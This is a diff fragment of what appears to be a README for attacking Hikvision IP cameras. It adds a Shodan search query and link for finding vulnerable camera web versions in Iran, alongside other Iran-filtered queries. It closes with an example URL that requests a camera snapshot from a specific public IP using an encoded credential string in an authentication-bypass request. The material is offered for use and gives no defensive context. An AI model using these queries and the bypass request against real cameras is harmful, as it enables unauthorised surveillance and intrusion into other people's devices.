@@ -17,6 +17,10 @@ Dork on shodan.io : "App-webs" "200 OK" country:"IR"
 
 Dork on shodan.io : Hikvision IP Camera country:"ir" "App-webs" "200 OK"
 
+2024 Dork on shodan.io : Web Version="3.1.3.150324" country:"ir"
+
+https://www.shodan.io/search?query=Web+Version%3D%223.1.3.150324%22+country%3A%22ir%22
+
 ******************************************************************************************************************************************************************************************************************************
 
 Example : http://91.98.131.177/onvif-http/snapshot?auth=YWRtaW46MTEK
